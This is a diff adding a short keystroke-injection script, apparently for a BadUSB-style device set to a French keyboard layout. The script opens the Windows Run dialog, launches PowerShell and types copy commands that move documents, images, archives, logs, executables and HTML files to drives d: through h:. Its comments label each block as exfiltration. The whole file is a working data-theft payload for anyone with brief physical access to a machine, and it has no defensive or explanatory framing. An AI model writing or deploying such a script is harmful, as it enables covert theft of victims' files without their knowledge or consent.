@@ -1,0 +1,74 @@
+layout('fr') //set layout fr
+
+press("GUI r") // windows + r
+delay(500) 
+type("powershell\n") // write powershell and press "enter"
+delay(1000)
+
+type("copy *.txt d:\n") //exflitre .txt file
+type("copy *.txt e:\n")
+type("copy *.txt f:\n")
+type("copy *.txt g:\n")
+type("copy *.txt h:\n")
+
+type("copy *.pdf d:\n") //exflitre .pdf file
+type("copy *.pdf e:\n")
+type("copy *.pdf f:\n")
+type("copy *.pdf g:\n")
+type("copy *.pdf h:\n")
+
+type("copy *.odt d:\n") //exflitre .odt file
+type("copy *.odt e:\n")
+type("copy *.odt f:\n")
+type("copy *.odt g:\n")
+type("copy *.odt h:\n")
+
+type("copy *.zip d:\n") //exflitre .zip file
+type("copy *.zip e:\n")
+type("copy *.zip f:\n")
+type("copy *.zip g:\n")
+type("copy *.zip h:\n")
+
+type("copy *.log d:\n") //exflitre .log file
+type("copy *.log e:\n")
+type("copy *.log f:\n")
+type("copy *.log g:\n")
+type("copy *.log h:\n")
+
+type("copy *.zip d:\n") //exflitre .zip file
+type("copy *.zip e:\n")
+type("copy *.zip f:\n")
+type("copy *.zip g:\n")
+type("copy *.zip h:\n")
+
+type("copy *.stl d:\n") //exflitre .stl file
+type("copy *.stl e:\n")
+type("copy *.stl f:\n")
+type("copy *.stl g:\n")
+type("copy *.stl h:\n")
+
+type("copy *.exe d:\n") //exflitre .exe file
+type("copy *.exe e:\n")
+type("copy *.exe f:\n")
+type("copy *.exe g:\n")
+type("copy *.exe h:\n")
+
+type("copy *.png d:\n") //exflitre .png file
+type("copy *.png e:\n")
+type("copy *.png f:\n")
+type("copy *.png g:\n")
+type("copy *.png h:\n")
+
+type("copy *.jpg d:\n") //exflitre .jpg file
+type("copy *.jpg e:\n")
+type("copy *.jpg f:\n")
+type("copy *.jpg g:\n")
+type("copy *.jpg h:\n")
+
+type("copy *.html d:\n") //exflitre .html file
+type("copy *.html e:\n")
+type("copy *.html f:\n")
+type("copy *.html g:\n")
+type("copy *.html h:\n")
+
+type("exit\n") //exit
